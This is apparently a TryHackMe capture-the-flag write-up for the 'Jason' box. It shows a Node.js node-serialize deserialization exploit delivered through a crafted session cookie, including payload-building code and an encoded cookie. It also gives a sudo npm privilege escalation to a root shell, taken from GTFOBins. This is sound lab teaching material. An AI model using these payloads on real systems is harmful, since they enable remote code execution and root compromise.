# JASON TryHackMe
> 7 November

#### Initial Foothold
Box begins with a nodejs deserialization vulnerability in the `session cookie` value for an initial foothold. However trying to run system commands don't return the output in response. To be sure of the user running web server can run commands via the deserialized cookie value I will just try to ping myself. After being sure of command execution, getting a reverse shell is going to be the next step.

#### Root
Checking for what can our user run as root, reveales `/usr/bin/npm *`. Going over GTFOBins gives the exploit we should run in order to get to root.

## Recon
Beginning with nmap, there are only two TCP ports open. One being SSH on Port 22 other is HTTP on Port 80. Looking over SSH Service information box is probably going to be `Focal`:

![image](https://user-images.githubusercontent.com/68084571/140642075-7ab13a96-6cd6-4dc7-8e02-ab76613d637d.png)

Going over the web service, looks like a nodejs given the information on the main page.

![image](https://user-images.githubusercontent.com/68084571/140642150-25535250-b0ec-4f42-8eb4-49e549313d25.png)

Looking to signing up function with an email address in burp, looks like Web Server assigns the user a session cookie.

![image](https://user-images.githubusercontent.com/68084571/140642217-1bb77e35-d876-4714-a2b1-ff90a0b021ef.png)

After decoding the cookie value, we get a valid json response.
```
$ echo eyJlbWFpbCI6InQifQ== | base64 -d 
{"email":"t"}
```
Using the cookie value assigned to us on the main page;

![image](https://user-images.githubusercontent.com/68084571/140642338-1044b5f3-fb39-4601-9f33-8f6f822956b8.png)

So seeing this made me almost sure of some type of a deserialization attack based on with a given valid serialized json object it processes the value of a parameter and reflects the output. To be sure of the attack phase is going to work or not, let's just send a crafted serialized json object as a cookie value and see the response for ourselves. After going over some research, a [medium blog post](https://medium.com/@chaudharyaditya/insecure-deserialization-3035c6b5766e) welcomes me. Using the provided code for creating a serialized object:
```node
var serialize = require('node-serialize');
x = {
  test : function(){ return 'DESERIALIZE'; }
};
console.log("Serialized: \n" + serialize.serialize(x));
```

However like the post pointed, as we try to run the serialized object generated from the payload the deserialization is not going to work, in order for the exploit work we have to make sure this function will be self invoking by adding `()` at the end.

![image](https://user-images.githubusercontent.com/68084571/140642593-e3061a0f-1b16-4266-8250-69b8a5c50904.png)

Changing the cookie with:

```bash
eyJlbWFpbCI6Il8kJE5EX0ZVTkMkJF9mdW5jdGlvbigpeyByZXR1cm4gJ0RFU0VSSUFMSVpFJzsgfSgpIn0=
```

![image](https://user-images.githubusercontent.com/68084571/140642719-1120d7c2-a553-4c5e-9ed8-ed1fc6abe813.png)

Now only thing there is to do is trying to execute code on the system and we can achieve it by changing the serialized object that we created a little bit more. Before moving forward to a valid reverse shell I would like to see any commands output wheter they are running also can we see the output from the command that we run.

```node
var serialize = require('node-serialize');
x = {
test : function(){
  require('child_process').execSync("whoami", function puts(error, stdout, stderr) {});
}
};
console.log("Serialized: \n" + serialize.serialize(x));
```

Not so lucky because we only get `We'll keep you updated at: guest`. Looks like we can't se who we are based upon the response, however what we can do is try to ping our attacking machine.

![image](https://user-images.githubusercontent.com/68084571/140642946-4b06cebe-6f1d-4f8a-b5e4-77fafb1fa37f.png)

Clearly we can see that we are executing code on the remote system. Next step will be a reverse shell on the box. To do so I will create a file then curl it from the server and execute it with bash.

### Shell As Dylan

![image](https://user-images.githubusercontent.com/68084571/140643017-32501d08-35fc-4202-9a05-7248096fd439.png)

We are on the box as user `dylan`. After getting a proper tty shell, first thing I will check for is can dylan run any command as root.

```bash
dylan@jason:/opt/webapp$ sudo -l
Matching Defaults entries for dylan on jason:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User dylan may run the following commands on jason:
    (ALL) NOPASSWD: /usr/bin/npm *
```
### Privesc

Seeing a wildcard that there might be an exploit for this. So going over [GTFOBins](https://gtfobins.github.io/):

```
    TF=$(mktemp -d)
    echo '{"scripts": {"preinstall": "/bin/sh"}}' > $TF/package.json
    sudo npm -C $TF --unsafe-perm i
```

![image](https://user-images.githubusercontent.com/68084571/140643171-2e31ece9-cbb7-4882-9f9d-b7e6d1931e92.png)
